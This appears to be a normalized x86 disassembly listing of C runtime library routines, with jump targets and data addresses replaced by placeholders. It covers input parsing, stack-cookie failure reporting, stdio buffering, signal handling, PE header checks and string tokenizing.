mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov ecx [ ebp - 0x1a4 ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19e ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a4 ]
lea esi [ ebp - 0x1d8 ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x200 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a4 ]
lea esi [ ebp - 0x1d8 ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
mov edi [ ebp - 0x1e4 ]
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a4 ]
lea esi [ ebp - 0x1d8 ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a4 ]
lea esi [ ebp - 0x1d8 ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
sub_2018388
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_2020300
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_2020300
pop ecx
sub_201848e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_20134c9
push eax
call sub_20204ef
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_20125d6
add eax 0x20
cmp esi eax
jne r-xdata
call sub_20125d6
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_201a99e
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_201852a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_200ba67
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_201855e
push 0x10
push r--data
call sub_200db54
call sub_20125d6
mov esi eax
add esi 0x20
mov [ ebp - 0x1c ] esi
xor eax eax
xor edi edi
cmp [ ebp + 0xc ] edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_201848e
mov edi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_201852a
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20185e6
mov eax [ ebp - 0x20 ]
call sub_200fb13
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200db99
retn
sub_2018699
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_200d4ca
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_200d4ca
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_2023a07
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_200d44f
mov [ esi ] eax
add esi 0x4
push esi
call sub_200d44f
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_201aa2f
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_201aa2f
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_200d44f
pop ecx
mov [ rw-data ] eax
sub_2018755
push esi
push 0x4
push 0x20
call sub_201a9e3
mov esi eax
push esi
call sub_200d44f
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_2018784
push 0xc
push r--data
call sub_200db54
call sub_200b753
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_2018699
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20187ba
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
sub_20187d7
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_200d44f
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_2018800
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_2018840
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_2018890
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_200dbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_2018800
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_2018840
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2018999
push 0x8
push r--data
call sub_200db54
push [ rw-data ]
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
call sub_201894d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_2018a00
push 0x10
push r--data
call sub_200db54
xor edi edi
push edi
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi rw-data
push [ rw-data ]
call sub_200d4ca
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x15
mov esi rw-data
push [ rw-data ]
call sub_200d4ca
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2018a7b
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax 0x1
je r-xdata
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
call sub_200d4c1
mov [ esi ] eax
xor eax eax
inc eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
pop ecx
call sub_200db99
retn 0x4
sub_2018a9b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_2018af1
push 0x10
push r--data
call sub_200db54
and [ ebp - 0x20 ] 0x0
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp esi 0x4
je r-xdata
cmp ebx 0x1
je r-xdata
cmp esi 0x3
je r-xdata
or eax 0xffffffff
cmp ebx 0x3
je r-xdata
push 0x2
pop edi
cmp ebx edi
je r-xdata
cmp ebx 0xd
je r-xdata
push 0x0
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
cmp ebx 0x15
je r-xdata
cmp ebx 0xf
jle r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x15
jne r-xdata
cmp ebx 0x16
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
cmp ebx 0x11
jle r-xdata
mov eax ebx
sub eax edi
je r-xdata
push 0x1
push sub_2018a00
call [ SetConsoleCtrlHandler@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
jne r-xdata
cmp ebx 0x6
je r-xdata
push [ rw-data ]
call sub_200d4ca
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x4
je r-xdata
call sub_200fb26
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov [ ebp - 0x20 ] 0x1
mov esi [ ebp + 0xc ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ebx 0xf
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2018ce9
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push esi
call sub_200d44f
mov [ rw-data ] eax
push [ rw-data ]
call sub_200d4ca
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x9
je r-xdata
cmp ebx 0x8
je r-xdata
mov edx [ ebp - 0x1c ]
push esi
call sub_200d44f
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call sub_200d4ca
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x6
je r-xdata
call sub_200d6da
mov esi eax
test esi esi
je r-xdata
cmp ebx 0x4
je r-xdata
call sub_200db99
retn
pop ecx
push esi
call sub_200d44f
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call sub_200d4ca
pop ecx
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
dec eax
jne r-xdata
mov edi r--data
cmp [ esi + 0x5c ] edi
jne r-xdata
cmp ebx 0xb
jne r-xdata
push esi
call sub_200d44f
mov [ rw-data ] eax
jmp r-xdata
push [ esi + 0x5c ]
mov edx ebx
call sub_2018a9b
pop ecx
test eax eax
je r-xdata
push [ rw-data ]
call sub_201a99e
pop ecx
mov [ esi + 0x5c ] eax
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
je r-xdata
push [ rw-data ]
push edi
push eax
call sub_2013e10
add esp 0xc
mov eax edx
jmp r-xdata
jmp r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
mov [ eax + 0x8 ] ecx
add eax 0xc
mov edi [ rw-data ]
imul edi edi 0xc
add edi [ esi + 0x5c ]
cmp eax edi
jae r-xdata
jmp r-xdata
sub_2018d2e
push 0x20
push r--data
call sub_200db54
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_200d6da
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_200db99
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_2018a9b
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_200b9e5
mov [ ebp - 0x1c ] 0x1
push eax
call sub_200d4ca
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_2010e3c
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_200d4c1
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2018ea2
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_2018eed
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
push [ rw-data ]
call sub_200d4ca
mov edi eax
mov eax [ ebp + 0x8 ]
xor esi esi
pop ecx
cmp eax esi
jne r-xdata
push ebx
mov [ eax ] esi
cmp edi esi
jne r-xdata
call sub_200fb13
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_200fa90
add esp 0x14
mov eax edi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
pop edi
pop esi
leave
retn
xor eax eax
call sub_200fb13
mov [ eax ] 0xc
call sub_200fb13
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
call sub_200fb13
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_200fa90
add esp 0x14
mov eax edi
jmp r-xdata
pop ebx
push edi
call sub_200d44f
pop ecx
mov esi eax
call sub_200d4c1
push esi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
je r-xdata
call sub_200fb13
mov edi [ GetLastError@IAT ]
mov ebx eax
call edi
push eax
call sub_200fad1
push esi
push esi
push esi
push esi
push esi
mov [ ebx ] eax
call sub_200fa90
add esp 0x18
call edi
push eax
call sub_200fad1
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_2018ff5
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_2023d77
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_2023c04
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_201a9e3
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_2023d77
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
push edi
call sub_2009d98
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_201a9e3
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_2009d98
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_2023d77
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_2019192
push 0x10
push r--data
call sub_200db54
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
sub_20191f2
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb13
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_202251a
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20192c9
mov eax [ ebp - 0x1c ]
call sub_200fb26
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_20192d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ edi ] ebx
jne r-xdata
cmp esi ebx
jne r-xdata
push edi
push [ ebp + 0xc ]
push esi
call sub_2023db4
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
mov esi [ edi ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
cmp [ eax ] bl
je r-xdata
jmp r-xdata
cmp [ edi ] bl
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ edi ]
push eax
call sub_201a899
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push eax
call sub_201a899
pop ecx
pop ecx
test eax eax
je r-xdata
mov al [ edi ]
cmp al [ esi ]
je r-xdata
lea eax [ edi + 0x1 ]
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp [ esi ] bl
jne r-xdata
inc esi
inc esi
cmp [ esi ] bl
je r-xdata
inc edi
cmp [ edi ] bl
jne r-xdata
inc edi
call sub_200fb13
mov [ eax ] 0x2a
mov dl [ edi ]
cmp dl [ esi ]
jne r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
mov [ ebp - 0x4 ] ebx
cmp [ eax ] bl
je r-xdata
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x2a
jmp r-xdata
mov edi eax
jmp r-xdata
cmp cl [ esi + 0x1 ]
je r-xdata
cmp [ edi ] bl
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ edi ]
push eax
call sub_201a899
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
cmp [ ebp - 0x8 ] esi
jne r-xdata
mov [ esi ] bl
inc esi
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push eax
call sub_201a899
pop ecx
pop ecx
test eax eax
je r-xdata
mov al [ edi ]
cmp al [ esi ]
je r-xdata
lea eax [ edi + 0x1 ]
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov [ esi ] bl
inc esi
jmp r-xdata
inc esi
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
inc edi
cmp [ edi ] bl
jne r-xdata
inc edi
jmp r-xdata
mov dl [ edi ]
cmp dl [ esi ]
jne r-xdata
